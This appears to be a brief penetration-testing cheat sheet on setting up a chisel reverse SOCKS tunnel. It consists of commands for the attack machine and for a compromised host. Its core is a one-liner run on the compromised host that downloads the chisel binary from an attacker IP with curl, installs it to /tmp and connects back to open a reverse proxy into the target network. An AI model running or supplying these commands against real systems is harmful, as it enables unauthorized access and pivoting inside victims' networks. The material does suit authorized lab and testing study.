on attack machine
transfer chisel binary
```
cd /usr/bin/chisel
```
```
python3 -m uploadserver
```

listener
```
chisel server -p 9000 --reverse &
```
	to close this server, kill the chisel server process
	ps aux | grep chisel
	pkill -f "chisel server"

on compromised host
```
curl -sf http://10.10.17.248:8000/chisel | install -m 755 /dev/stdin /tmp/chisel && /tmp/chisel client 10.10.17.248:9000 R:socks
```

